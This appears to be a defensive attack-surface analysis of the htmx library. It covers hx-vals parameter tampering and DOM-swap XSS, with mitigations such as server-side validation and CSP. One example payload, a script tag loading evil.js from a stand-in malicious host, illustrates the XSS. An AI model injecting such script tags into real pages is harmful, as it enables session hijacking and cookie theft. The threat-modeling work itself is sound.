# Attack Surface Analysis for bigskysoftware/htmx

## Attack Surface: [1. `hx-vals` Parameter Tampering](./attack_surfaces/1___hx-vals__parameter_tampering.md)

*   **Description:** Attackers can modify the values within the `hx-vals` attribute before the HTMX request is sent to the server, leading to server-side vulnerabilities due to untrusted client input.
*   **HTMX Contribution:** HTMX's `hx-vals` attribute is designed to send client-side data to the server, making it a direct vector for parameter manipulation if server-side validation is insufficient.
*   **Example:** An application uses `hx-vals` to transmit user roles for authorization in an HTMX request. An attacker modifies `hx-vals` to elevate their role to "admin" before sending the request. If the server trusts this client-provided role without proper server-side verification, the attacker could gain unauthorized administrative access.
*   **Impact:** Business Logic Bypass, Unauthorized Access, Data Manipulation, Potential for privilege escalation and significant system compromise depending on the application logic.
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   **Strict Server-Side Input Validation:** **Mandatory server-side validation and sanitization of ALL data received via `hx-vals`.** Treat all client-provided data as untrusted.
    *   **Server-Side Authorization:** Implement robust server-side authorization mechanisms that do not rely on client-provided roles or permissions in `hx-vals`. Use server-side sessions or databases to manage user roles and permissions securely.
    *   **Principle of Least Privilege:** Design server-side logic to only process and utilize explicitly expected and validated parameters from `hx-vals`. Ignore or reject unexpected or invalid data.

## Attack Surface: [2. Client-Side DOM Clobbering leading to Cross-Site Scripting (XSS)](./attack_surfaces/2__client-side_dom_clobbering_leading_to_cross-site_scripting__xss_.md)

*   **Description:** Malicious server responses, specifically crafted to exploit HTMX's DOM swapping mechanism, can clobber existing DOM elements and inject attacker-controlled JavaScript, leading to Cross-Site Scripting (XSS).
*   **HTMX Contribution:** HTMX's core functionality of swapping and replacing DOM elements based on server responses provides a direct pathway for injecting malicious content into the client-side DOM if server responses are not carefully controlled.
*   **Example:** An attacker compromises a server or finds an injection point that allows them to manipulate server responses for HTMX requests. They craft a response that includes HTML like `<script src="https://malicious.example.com/evil.js"></script>`. When HTMX processes this response and injects it into the DOM, the malicious script from `malicious.example.com` is executed in the user's browser, leading to XSS.
*   **Impact:** Cross-Site Scripting (XSS), Session Hijacking, Cookie Theft, Account Takeover, Defacement, Redirection to Malicious Sites, Full compromise of the user's browser session within the application's context.
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   **Robust Server-Side Output Encoding/Escaping:** **Critically important to implement rigorous server-side output encoding/escaping for ALL data included in HTML responses, especially those intended for HTMX to inject.** Use context-aware escaping appropriate for HTML to prevent injection of script tags or event handlers.
    *   **Content Security Policy (CSP):** Implement a strict Content Security Policy (CSP) that significantly restricts the sources from which scripts can be loaded and limits other browser capabilities to mitigate the impact of XSS.  Specifically, use `script-src` directive to control script sources and consider `nonce` or `hash` based CSP for inline scripts if absolutely necessary.
    *   **Secure Server Infrastructure and Response Handling:** Harden server infrastructure to prevent compromises that could lead to malicious server responses. Carefully review and sanitize all server-side code paths that generate HTML responses for HTMX, ensuring no attacker-controlled data can be injected without proper escaping.
